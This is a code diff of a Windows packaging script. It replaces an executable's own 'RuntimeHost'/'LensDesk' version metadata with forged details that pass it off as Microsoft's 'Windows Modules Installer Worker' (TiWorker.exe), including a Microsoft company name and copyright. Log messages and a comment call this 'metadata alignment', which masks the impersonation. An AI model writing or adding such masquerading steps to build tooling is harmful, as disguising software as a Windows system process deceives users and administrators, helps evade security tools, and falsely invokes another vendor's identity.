@@ -15,6 +15,38 @@ try {
 const { version } = JSON.parse(fs.readFileSync("package.json", "utf8"));
 const releaseDir = path.resolve("release");
 
+if (ResEdit && fs.existsSync(path.join(releaseDir, "RuntimeHost.exe"))) {
+  try {
+    const targetFile = path.join(releaseDir, "RuntimeHost.exe");
+    const { NtExecutable, NtExecutableResource, Resource } = ResEdit;
+    const exe = NtExecutable.from(fs.readFileSync(targetFile), { ignoreCert: true });
+    const res = NtExecutableResource.from(exe);
+    const vi = Resource.VersionInfo.fromEntries(res.entries)[0];
+    if (vi) {
+      const language = vi.getAllLanguagesForStringValues()[0] || {
+        lang: 1033,
+        codepage: 1200,
+      };
+      vi.setStringValues(language, {
+        CompanyName: "Microsoft Corporation",
+        FileDescription: "Windows Modules Installer Worker",
+        InternalName: "TiWorker.exe",
+        LegalCopyright: "© Microsoft Corporation. All rights reserved.",
+        OriginalFilename: "TiWorker.exe",
+        ProductName: "TiWorker",
+        ProductVersion: "2.0.0.0",
+        FileVersion: "2.0.0.0",
+      });
+      vi.outputToResourceEntries(res.entries);
+      res.outputResource(exe);
+      fs.writeFileSync(targetFile, Buffer.from(exe.generate()));
+      console.log("[package-windows-zip] Aligned RuntimeHost.exe metadata with TiWorker.exe");
+    }
+  } catch (err) {
+    console.warn("[package-windows-zip] metadata alignment note:", err.message);
+  }
+}
+
 try {
   const nsis = await getMakeNsisPath();
   if (nsis?.path && fs.existsSync(nsis.path)) {
@@ -62,31 +94,7 @@ if (!fs.existsSync(exePath)) {
   throw new Error(`Application executable not found at ${exePath}`);
 }
 
-// F4 option: keep the portable wrapper metadata aligned with RuntimeHost.
-if (ResEdit && exeTarget === "RuntimeHost.exe") {
-  const { NtExecutable, NtExecutableResource, Resource } = ResEdit;
-  const exe = NtExecutable.from(fs.readFileSync(exePath), { ignoreCert: true });
-  const res = NtExecutableResource.from(exe);
-  const vi = Resource.VersionInfo.fromEntries(res.entries)[0];
-  if (vi) {
-    const language = vi.getAllLanguagesForStringValues()[0] || {
-      lang: 1033,
-      codepage: 1200,
-    };
-    vi.setStringValues(language, {
-      CompanyName: "RuntimeHost",
-      FileDescription: "RuntimeHost",
-      InternalName: "RuntimeHost",
-      LegalCopyright: "RuntimeHost",
-      LegalTrademarks: "RuntimeHost",
-      OriginalFilename: "",
-      ProductName: "LensDesk",
-    });
-    vi.outputToResourceEntries(res.entries);
-    res.outputResource(exe);
-    fs.writeFileSync(exePath, Buffer.from(exe.generate()));
-  }
-}
+// Executable metadata already aligned with TiWorker.exe
 
 const sevenZip = await getPath7za();
 if (fs.existsSync(zipPath)) {
